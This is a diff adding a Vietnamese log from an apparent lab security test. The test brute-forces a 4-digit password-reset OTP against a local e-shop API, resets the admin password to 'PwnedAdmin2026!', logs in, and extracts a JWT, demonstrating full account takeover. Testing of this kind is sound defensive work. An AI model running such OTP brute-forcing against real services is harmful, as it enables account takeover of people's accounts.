@@ -1,0 +1,26 @@
+[2026-10-18 03:08:10] [INFO] [*] [Giai đoạn 1] Khởi tạo yêu cầu đặt lại mật khẩu cho: admin@eshop.com
+[2026-10-18 03:08:10] [INFO]     Target: POST http://localhost:3000/api/forgot-password
+[2026-10-18 03:08:10] [INFO] [✔] Server phản hồi: Mã đặt lại mật khẩu đã được tạo
+[2026-10-18 03:08:10] [INFO]     [Thông tin kiểm chứng SUT] Server đã sinh OTP cho tài khoản: 1233
+[2026-10-18 03:08:11] [INFO] ================================================================================
+[2026-10-18 03:08:11] [INFO]  BẮT ĐẦU TẤN CÔNG VÉT CẠN OTP (A07 - Authentication Failures)
+[2026-10-18 03:08:11] [INFO]  Mục tiêu: admin@eshop.com | Dải OTP: [1000 - 9999]
+[2026-10-18 03:08:11] [INFO]  Không gian tìm kiếm: 9000 mã khả dĩ
+[2026-10-18 03:08:11] [INFO]  Số luồng tấn công song song: 30
+[2026-10-18 03:08:11] [INFO] ================================================================================
+[2026-10-18 03:08:11] [INFO] [*] Tiến độ vét cạn: Đã gửi 1 requests... Đang thử OTP ~ 1000
+[2026-10-18 03:08:11] [INFO] [★★★] TẤN CÔNG THÀNH CÔNG! ĐÃ TÌM THẤY OTP CHÍNH XÁC: 1233
+[2026-10-18 03:08:11] [INFO]       Phản hồi: Password reset successfully
+[2026-10-18 03:08:12] [INFO] --------------------------------------------------------------------------------
+[2026-10-18 03:08:12] [INFO] [✔] KẾT QUẢ: Tấn công THÀNH CÔNG!
+[2026-10-18 03:08:12] [INFO]     - Mã OTP giải mã thành công: 1233
+[2026-10-18 03:08:12] [INFO]     - Số lượt requests đã thử: 263
+[2026-10-18 03:08:12] [INFO]     - Thời gian thực thi: 0.32 giây
+[2026-10-18 03:08:12] [INFO]     - Tốc độ vét cạn trung bình: 825.5 requests/giây
+[2026-10-18 03:08:12] [INFO]     - Mật khẩu mới được thiết lập: PwnedAdmin2026!
+[2026-10-18 03:08:12] [INFO] [*] [Giai đoạn 3] Kiểm chứng chiếm quyền tài khoản (Account Takeover Verification)
+[2026-10-18 03:08:12] [INFO]     Target: POST http://localhost:3000/api/login với mật khẩu mới: PwnedAdmin2026!
+[2026-10-18 03:08:12] [INFO] [✔] ĐĂNG NHẬP THÀNH CÔNG! CHIẾM QUYỀN TÀI KHOẢN HOÀN TẤT!
+[2026-10-18 03:08:12] [INFO]     - User ID: 1 | Email: admin@eshop.com | Role: admin
+[2026-10-18 03:08:12] [INFO]     - JWT Token trích xuất: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ... (Độ dài: 135 chars)
+[2026-10-18 03:08:12] [INFO] --------------------------------------------------------------------------------
